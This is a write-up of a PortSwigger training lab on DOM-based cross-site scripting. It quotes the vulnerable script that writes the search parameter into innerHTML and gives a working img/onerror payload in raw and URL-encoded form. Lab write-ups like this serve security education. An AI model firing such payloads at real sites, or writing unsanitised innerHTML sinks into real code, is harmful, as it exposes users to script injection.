# DOM XSS in innerHTML sink using source location.search

**Lab Url**: [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

![Lab Description](img/lab-description.png)

## Analysis

As usual, the initial step is to understand how the vulnerable application works and gather information about the target system. This application also serves as a collection of blog posts. It also has a search bar on top of it. The search bar contains a form that requests the user **search query** using the `GET` Method.

The search page contains a `<script></script>` tag with the `doSearchQuery` function inside it.

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

This function takes the **search parameter** and appends it's content inside `<span id="searchMessage"></span>` as raw HTML.

## Payload

With the correct payload, we can escape the DOM and inject a `<script></script>` tag.

```html
<img src=xxx onerror="alert(document.domain)" />
```

```bash
/?search=<img+src%3Dxxx+onerror%3D"alert%28document.domain%29"+%2F>
```

The payload was successful, and we successfully popped up an alert box.

![Lab Solved](img/lab-solved.png)
